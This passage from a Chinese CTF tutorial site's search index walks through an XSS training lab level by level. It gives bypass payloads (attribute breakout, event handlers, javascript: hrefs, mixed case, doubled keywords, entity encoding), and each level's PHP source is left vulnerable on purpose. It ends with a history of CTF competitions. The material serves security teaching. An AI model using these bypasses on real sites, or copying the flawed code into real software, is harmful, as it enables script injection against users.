<p></p>"},{"location":"Web/Chapter9/9-2/","title":"URL XSS","text":""},{"location":"Web/Chapter9/9-2/#url-xss","title":"URL XSS","text":"<p>\u7b2c\u4e00\u5173</p> <p>\u53ef\u4ee5\u53d1\u73b0 <code>name</code> \u53c2\u6570\u6e32\u67d3\u5230\u4e86\u7f51\u9875\u4e0a</p> <p></p> <p>\u5c1d\u8bd5\u4f20\u5165\u6076\u610f\u4ee3\u7801</p> <pre><code>?name=&lt;script&gt;alert()&lt;/script&gt;\n</code></pre> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level2.php?keyword=test\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level1&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level1&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"name\"];\necho \"&lt;h2 align=center&gt;\u6b22\u8fce\u7528\u6237\".$str.\"&lt;/h2&gt;\";  // \u76f4\u63a5\u5c06 $str \u62fc\u63a5\u5230\u4e86\u6807\u7b7e\u4e2d\u5bfc\u81f4\u5b58\u5728\u6f0f\u6d1e\n?&gt;\n&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-3/","title":"\u95ed\u5408\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-3/#\u95ed\u5408\u7ed5\u8fc7","title":"\u95ed\u5408\u7ed5\u8fc7","text":"<p>\u7b2c\u4e8c\u5173</p> <p>\u76f4\u63a5\u8f93\u5165\u4e0a\u4e00\u5173 payload \u6ca1\u6709\u6267\u884c</p> <p></p> <p>\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u53d1\u73b0\u88ab\u63d2\u5165\u5230\u4e86 <code>value</code></p> <p></p> <p>\u5c1d\u8bd5\u95ed\u5408\u6389 <code>input</code> \u6807\u7b7e\u53ca\u540e\u9762\u7684 <code>\"&gt;</code></p> <pre><code>\"&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;\"\n</code></pre> <p>\u6210\u529f\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level3.php?writing=wait\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level2&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level2&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n// htmlspecialchars()\uff1a\u8f6c\u4e49 &amp; \" ' &lt; &gt;\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form action=level2.php method=GET&gt;\n&lt;input name=keyword  value=\"'.$str.'\"\n&lt;input type=submit name=submit value=\"\u641c\u7d22\"/&gt;\n&lt;/form&gt;\n&lt;/center&gt;';     // \u8fd9\u4e00\u6bb5\u76f4\u63a5\u5c06 $str \u62fc\u63a5\u5230\u4e86 value \u4e2d\u5bfc\u81f4\u5b58\u5728\u6f0f\u6d1e\n?&gt;\n&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-4/","title":"\u4e8b\u4ef6\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-4/#\u4e8b\u4ef6\u7ed5\u8fc7","title":"\u4e8b\u4ef6\u7ed5\u8fc7","text":"<p>\u7b2c\u4e09\u5173</p> <p>\u4f7f\u7528\u4e0a\u4e00\u5173\u7684 payload \u53d1\u73b0\u4e5f\u88ab\u8f6c\u4e49\u4e86</p> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e8b\u4ef6\u7ed5\u8fc7\uff0c\u4e8b\u4ef6\u4e3b\u8981\u5b58\u5728\u4e8e\u4e00\u4e9b\u6807\u7b7e\u7684\u5c5e\u6027\u5185\u90e8</p> <p>\u8fd8\u662f\u8981\u95ed\u5408\u4e0b <code>value</code></p> <pre><code>'onclick=javascript:alert()'    &lt;!-- \u70b9\u51fb\u4e8b\u4ef6 --!&gt;\n</code></pre> <p>\u63d0\u4ea4\u540e\u53ef\u4ee5\u770b\u5230 <code>input</code> \u6807\u7b7e\u4e2d\u591a\u4e86\u4e2a <code>onclick</code> \u4e8b\u4ef6</p> <p></p> <p>\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5728\u70b9\u51fb\u8fd9\u4e2a <code>input</code> \u5373\u53ef\u5f39\u7a97</p> <p></p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level4.php?keyword=try harder!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level3&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level3&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".\"&lt;center&gt;\n&lt;form action=level3.php method=GET&gt;\n&lt;input name=keyword  value='\".htmlspecialchars($str).\"'&gt;    \n&lt;input type=submit name=submit value=\u641c\u7d22 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;\";\n?&gt;\n&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-5/","title":"a href \u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-5/#a-href-\u7ed5\u8fc7","title":"a href \u7ed5\u8fc7","text":"<p>\u7b2c\u4e94\u5173</p> <p>\u4f7f\u7528\u4e0a\u4e00\u5173 payload \u53d1\u73b0 <code>on</code> \u88ab\u66ff\u6362\u4e3a\u4e86 <code>o_n</code></p> <p></p> <p>\u8fd9\u4e0b\u57fa\u672c\u4e0a\u5927\u90e8\u5206\u4e8b\u4ef6\u51fd\u6570\u90fd\u4e0d\u80fd\u7528\u4e86</p> <p>\u6362\u4e00\u4e0b\u601d\u8def\u5c1d\u8bd5\u6ce8\u5165\u4e00\u4e2a <code>a</code> \u6807\u7b7e\u8bd5\u8bd5\uff0c\u53ef\u4ee5\u5728\u5176 <code>href</code> \u5c5e\u6027\u4e2d\u63d2\u5165 JS \u4ee3\u7801</p> <pre><code>\"&gt;&lt;a href=javascript:alert()&gt;\u96fe\u5cf6\u98ce\u8d77\u6642&lt;/a&gt;&lt;\"\n</code></pre> <p>\u70b9\u51fb\u6807\u7b7e\u540e\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level6.php?keyword=break it out!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level5&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level5&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);    // \u505a\u4e86\u66ff\u6362\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form action=level5.php method=GET&gt;\n&lt;input name=keyword  value=\"'.$str3.'\"&gt;\n&lt;input type=submit name=submit value=\u641c\u7d22 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str3).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-6/","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-6/#\u5927\u5c0f\u5199\u7ed5\u8fc7","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7","text":"<p>\u7b2c\u516d\u5173</p> <p>\u7ee7\u7eed\u4f7f\u7528\u4e0a\u4e00\u5173\u7684 payload \u53d1\u73b0 <code>href</code> \u88ab\u8fc7\u6ee4\u4e86</p> <p></p> <p>\u5c1d\u8bd5\u5927\u5c0f\u5199\u6df7\u6dc6</p> <pre><code>\"&gt;&lt;a hRef=javascript:alert()&gt;\u96fe\u5cf6\u98ce\u8d77\u6642&lt;/a&gt;&lt;\"\n</code></pre> <p>\u70b9\u51fb\u540e\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level7.php?keyword=move up!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level6&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level6&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"keyword\"];\n$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);    \n$str4=str_replace(\"src\",\"sr_c\",$str3);  \n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);    // \u53ea\u5339\u914d href\uff0c\u533a\u5206\u5927\u5c0f\u5199\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form action=level6.php method=GET&gt;\n&lt;input name=keyword  value=\"'.$str6.'\"&gt;\n&lt;input type=submit name=submit value=\u641c\u7d22 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str6).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-7/","title":"\u53cc\u5199\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-7/#\u53cc\u5199\u7ed5\u8fc7","title":"\u53cc\u5199\u7ed5\u8fc7","text":"<p>\u7b2c\u4e03\u5173</p> <p>\u7ee7\u7eed\u4f7f\u7528\u4e0a\u4e00\u5173\u7684 payload \u53d1\u73b0\u6574\u4e2a <code>hRef</code> \u88ab\u5220\u9664\u4ee5\u53ca\u5220\u9664\u4e86 <code>script</code></p> <p></p> <p>\u63a8\u6d4b\u662f\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u5c1d\u8bd5\u53cc\u5199\u5173\u952e\u5b57</p> <pre><code>\"&gt; &lt;a hRhRefef=javascrscriptipt:alert()&gt;\u96fe\u5cf6\u98ce\u8d77\u6642&lt;/a&gt; &lt;\"\n</code></pre> <p>\u70b9\u51fb\u540e\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level8.php?keyword=nice try!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level7&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level7&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str =strtolower( $_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"\",$str);\n$str3=str_replace(\"on\",\"\",$str2);\n$str4=str_replace(\"src\",\"\",$str3);\n$str5=str_replace(\"data\",\"\",$str4);\n$str6=str_replace(\"href\",\"\",$str5);\necho \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\".htmlspecialchars($str).\"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\".'&lt;center&gt;\n&lt;form action=level7.php method=GET&gt;\n&lt;input name=keyword  value=\"'.$str6.'\"&gt;\n&lt;input type=submit name=submit value=\u641c\u7d22 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str6).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-8/","title":"Unicode \u7f16\u7801\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-8/#unicode-\u7f16\u7801\u7ed5\u8fc7","title":"Unicode \u7f16\u7801\u7ed5\u8fc7","text":"<p>\u7b2c\u516b\u5173</p> <p>\u8fd9\u4e00\u5173\u662f\u76f4\u63a5\u5c06\u6211\u4eec\u7684\u503c\u63d2\u5165\u5230 <code>href</code> \u5c5e\u6027\u5185\uff0c\u8bd5\u8fc7\u4e86\u524d\u51e0\u79cd\u65b9\u6cd5\u90fd\u4e0d\u7ba1\u7528</p> <p></p> <p>\u4f46\u662f\u6211\u4eec\u80fd\u5229\u7528 <code>href</code> \u7684\u9690\u85cf\u5c5e\u6027\u81ea\u52a8 Unicode \u89e3\u7801</p> <pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;\n</code></pre> <p>\u70b9\u51fb\u540e\u5f39\u7a97</p> <p></p> <p>\u770b\u4e00\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level9.php?keyword=not bad!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level8&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level8&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);  // \u5168\u90fd\u8f6c\u5c0f\u5199\u4e86\uff0c\u5927\u5c0f\u5199\u6df7\u6dc6\u7ed5\u4e0d\u4e86\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&amp;quot',$str6);\necho '&lt;center&gt;\n&lt;form action=level8.php method=GET&gt;\n&lt;input name=keyword  value=\"'.htmlspecialchars($str).'\"&gt;\n&lt;input type=submit name=submit value=\u6dfb\u52a0\u53cb\u60c5\u94fe\u63a5 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;?php\n echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;\u53cb\u60c5\u94fe\u63a5&lt;/a&gt;&lt;/center&gt;';\n?&gt;\n&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str7).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Web/Chapter9/9-9/","title":"\u6ce8\u91ca\u7ed5\u8fc7","text":""},{"location":"Web/Chapter9/9-9/#\u6ce8\u91ca\u7ed5\u8fc7","title":"\u6ce8\u91ca\u7ed5\u8fc7","text":"<p>\u7b2c\u4e5d\u5173</p> <p>\u8bd5\u4e86\u4e0b\u4e0a\u4e00\u5173\u7684 payload\uff0c\u4e0d\u884c\uff0c\u538b\u6839\u90fd\u6ca1\u63d2\u5165</p> <p></p> <p>\u8f93\u5165\u6b63\u5e38\u94fe\u63a5\u540e\u5bf9\u6bd4\u53d1\u73b0\u7f3a\u5c11\u4e86 <code>http://</code></p> <p>\u6240\u4ee5\u5728\u539f payload \u540e\u9762\u8865\u4e0a\u5e76\u6ce8\u91ca\u6389\u5373\u53ef</p> <pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/\n</code></pre> <p>\u70b9\u51fb\u5f39\u7a97</p> <p></p> <p>\u67e5\u770b\u4e0b\u6e90\u4ee3\u7801</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;\n&lt;script&gt;\nwindow.alert = function()  \n{     \nconfirm(\"\u5b8c\u6210\u7684\u4e0d\u9519\uff01\");\n window.location.href=\"level10.php?keyword=well done!\"; \n}\n&lt;/script&gt;\n&lt;title&gt;\u6b22\u8fce\u6765\u5230level9&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level9&lt;/h1&gt;\n&lt;?php \nini_set(\"display_errors\", 0);\n$str = strtolower($_GET[\"keyword\"]);\n$str2=str_replace(\"script\",\"scr_ipt\",$str);\n$str3=str_replace(\"on\",\"o_n\",$str2);\n$str4=str_replace(\"src\",\"sr_c\",$str3);\n$str5=str_replace(\"data\",\"da_ta\",$str4);\n$str6=str_replace(\"href\",\"hr_ef\",$str5);\n$str7=str_replace('\"','&amp;quot',$str6);\necho '&lt;center&gt;\n&lt;form action=level9.php method=GET&gt;\n&lt;input name=keyword  value=\"'.htmlspecialchars($str).'\"&gt;\n&lt;input type=submit name=submit value=\u6dfb\u52a0\u53cb\u60c5\u94fe\u63a5 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n?&gt;\n&lt;?php\nif(false===strpos($str7,'http://'))     // \u8fd9\u91cc\u6709\u4e2a\u6821\u9a8c\n{\n  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"\u60a8\u7684\u94fe\u63a5\u4e0d\u5408\u6cd5\uff1f\u6709\u6ca1\u6709\uff01\"&gt;\u53cb\u60c5\u94fe\u63a5&lt;/a&gt;&lt;/center&gt;';\n        }\nelse\n{\n  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"'.$str7.'\"&gt;\u53cb\u60c5\u94fe\u63a5&lt;/a&gt;&lt;/center&gt;';\n}\n?&gt;\n&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;\n&lt;?php \necho \"&lt;h3 align=center&gt;payload\u7684\u957f\u5ea6:\".strlen($str7).\"&lt;/h3&gt;\";\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"basic/history/","title":"CTF\u7684\u5386\u53f2\uff08History of CTF\uff09","text":"<p>CTF\uff08Capture The Flag\uff09 \u662f\u5982\u4eca\u7f51\u7edc\u5b89\u5168\u793e\u533a\u4e2d\u6700\u91cd\u8981\u7684\u6280\u672f\u7ade\u8d5b\u4f53\u7cfb\u4e4b\u4e00\uff0c\u4f46\u5b83\u7684\u8bde\u751f\u5176\u5b9e\u6e90\u81ea\u9ed1\u5ba2\u6587\u5316\u7684\u53d1\u5c55\uff0c\u4ee5\u53ca\u4e16\u754c\u4e0a\u6700\u8457\u540d\u7684\u5b89\u5168\u5927\u4f1a\u2014\u2014DEFCON\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u4e00\u8d77\u4ece\u5934\u4e86\u89e3 CTF \u7684\u53d1\u5c55\u5386\u7a0b\u3002</p>"},{"location":"basic/history/#\u8d77\u6e901996-\u5e74-defcon\u4e16\u754c\u9ed1\u5ba2\u5927\u4f1a","title":"\u8d77\u6e90\uff1a1996 \u5e74 DEFCON\uff08\u4e16\u754c\u9ed1\u5ba2\u5927\u4f1a\uff09","text":"<p>CTF \u6700\u65e9\u8bde\u751f\u4e8e 1996 \u5e74 DEFCON 4\u2014\u2014\u5f53\u65f6\u7684\u4e00\u4f4d\u5b89\u5168\u7814\u7a76\u5458 Jeff Moss\uff08Dark Tangent\uff09 \u8bbe\u8ba1\u4e86\u9996\u4e2a \u201c\u7f51\u7edc\u653b\u9632\u6e38\u620f\u201d\uff0c\u8ba9\u53c2\u4f1a\u8005\u653b\u51fb\u5bf9\u65b9\u7684\u7cfb\u7edf\u5e76\u4fdd\u62a4\u81ea\u5df1\u7684\u7cfb\u7edf\u3002</p> <p>\u7b2c\u4e00\u6b21 CTF \u7684\u7279\u70b9\uff1a</p> <ul> <li>\u5b8c\u5168\u7ebf\u4e0b</li> <li>\u653b\u9632\u578b\uff08Attack &amp; Defense\uff09</li> <li>\u4f7f\u7528\u771f\u5b9e\u7cfb\u7edf\u7f51\u7edc</li> <li>\u591a\u4eba\u4e71\u6218\u5f0f</li> <li>\u582a\u79f0\u201c\u9ed1\u5ba2\u7ade\u6280\u539f\u578b\u201d</li> </ul> <p>\u8fd9\u573a\u6bd4\u8d5b\u540e\u6765\u88ab\u8ba4\u4e3a\u662f\uff1a</p> <p>\u5168\u7403\u7b2c\u4e00\u573a CTF \u6bd4\u8d5b\u7684\u8d77\u70b9</p>"},{"location":"basic/history/#2000-\u5e74\u524dctf-\u4ecd\u662f\u5c0f\u5708\u5b50\u91cc\u7684\u9ed1\u5ba2\u6e38\u620f","title":"2000 \u5e74\u524d\uff1aCTF \u4ecd\u662f\u5c0f\u5708\u5b50\u91cc\u7684\u201c\u9ed1\u5ba2\u6e38\u620f\u201d","text":"<p>1996\uff5e2000 \u671f\u95f4\uff1a</p> <ul> <li>CTF \u53ea\u5728 DEFCON \u4e0a\u4e3e\u884c</li> <li>\u6ca1\u6709\u660e\u786e\u89c4\u5219</li> <li>\u6bd4\u8d5b\u5f62\u5f0f\u975e\u5e38\u201c\u91ce\u751f\u201d</li> <li>\u53c2\u4e0e\u8005\u591a\u4e3a\u786c\u6838\u9ed1\u5ba2\u4e0e\u7814\u7a76\u5458</li> </ul> <p>\u8fd9\u4e2a\u9636\u6bb5\u7684 CTF \u66f4\u50cf\u662f\uff1a</p> <p>\u201c\u5927\u578b\u5b89\u5168\u5927\u4f1a\u5609\u5e74\u534e\u7684\u4e00\u90e8\u5206\u201d</p> <p>\u5e76\u6ca1\u6709\u5f62\u6210\u771f\u6b63\u7684\u5168\u7403\u5f71\u54cd\u529b\u3002</p>"},{"location":"basic/history/#2000s\u9ad8\u6821\u52a0\u5165ctf-\u5f00\u59cb\u6b63\u89c4\u5316","title":"2000s\uff1a\u9ad8\u6821\u52a0\u5165\uff0cCTF \u5f00\u59cb\u6b63\u89c4\u5316","text":"<p>\u8fdb\u5165 21 \u4e16\u7eaa\u540e\uff0c\u8d8a\u6765\u8d8a\u591a\u9ad8\u6821\u4e0e\u5b9e\u9a8c\u5ba4\u5173\u6ce8\u7f51\u7edc\u5b89\u5168\u4eba\u624d\u57f9\u517b\uff0c\u5305\u62ec\uff1a</p> <ul> <li>MIT</li> <li>CMU\uff08\u5361\u5185\u57fa\u6885\u9686\u5927\u5b66\uff09</li> <li>UCSB\uff08\u52a0\u5dde\u5927\u5b66\u5723\u5854\u82ad\u82ad\u62c9\uff09</li> <li>\u65e5\u672c\u3001\u97e9\u56fd\u7b49\u4e9a\u6d32\u9ad8\u6821</li> </ul> <p>\u4ed6\u4eec\u5f00\u59cb\uff1a</p> <ul> <li>\u6a21\u4eff DEFCON \u529e\u6bd4\u8d5b</li> <li>\u8bbe\u8ba1\u9898\u76ee</li> <li>\u7eb3\u5165\u8bfe\u7a0b</li> <li>\u57f9\u517b\u6218\u961f</li> </ul> <p>\u8fd9\u4e00\u65f6\u671f\u6700\u91cd\u8981\u7684\u91cc\u7a0b\u7891\uff1a</p>"},{"location":"basic/history/#2001-\u5e74ucsb-ictf\u56fd\u9645\u653b\u9632\u8d5b\u521b\u529e","title":"2001 \u5e74\uff1aUCSB iCTF\uff08\u56fd\u9645\u653b\u9632\u8d5b\uff09\u521b\u529e","text":"<p>\u5b83\u6210\u4e3a \u4e16\u754c\u4e0a\u6301\u7eed\u65f6\u95f4\u6700\u957f\u7684\u5b66\u672f\u7c7b\u653b\u9632 CTF\u3002</p>"},{"location":"basic/history/#20082013\u9898\u76ee\u8d5bjeopardy\u5174\u8d77","title":"2008\u20132013\uff1a\u9898\u76ee\u8d5b\uff08Jeopardy\uff09\u5174\u8d77","text":"<p>\u653b\u9632\u578b\u6bd4\u8d5b\u9700\u8981\u590d\u6742\u73af\u5883\uff0c\u56e0\u6b64\u5f88\u591a\u7ec4\u7ec7\u5f00\u59cb\u63a8\u51fa\u66f4\u5bb9\u6613\u53c2\u4e0e\u7684\u7ebf\u4e0a\u8d5b\u5236\u2014\u2014Jeopardy \u89e3\u9898\u6a21\u5f0f\u3002</p> <p>\u89e3\u9898\u8d5b\u7684\u5feb\u901f\u4f20\u64ad\uff0c\u8ba9 CTF \u771f\u6b63\u4ece\u201c\u4e13\u4e1a\u9ed1\u5ba2\u805a\u4f1a\u201d\u53d8\u6210\uff1a</p> <p>\u5168\u7403\u7f51\u7edc\u5b89\u5168\u7231\u597d\u8005\u90fd\u80fd\u53c2\u4e0e\u7684\u5b66\u4e60\u7ade\u8d5b</p> <p>\u8fd9\u4e2a\u65f6\u4ee3 CTF \u9898\u76ee\u6570\u91cf\u7206\u70b8\u5f0f\u589e\u957f\u3002</p>"},{"location":"basic/history/#2013\u81f3\u4eca\u5168\u7403\u5316--\u4e13\u4e1a\u5316\u65f6\u4ee3","title":"2013\u2013\u81f3\u4eca\uff1a\u5168\u7403\u5316 &amp; \u4e13\u4e1a\u5316\u65f6\u4ee3","text":"<p>2013 \u5e74\u4ee5\u540e\uff0cCTF \u7684\u5f71\u54cd\u529b\u8fbe\u5230\u5dc5\u5cf0\uff0c\u5e76\u5f62\u6210\u5b8c\u6574\u751f\u6001\uff1a</p> <ul> <li>\u9ad8\u6821\u5f62\u6210\u4e13\u4e1a\u6218\u961f</li> <li>\u4f01\u4e1a\u529e\u5927\u578b CTF\uff08Google\u3001\u5fae\u8f6f\u3001\u963f\u91cc\u3001\u817e\u8baf\u7b49\uff09</li> 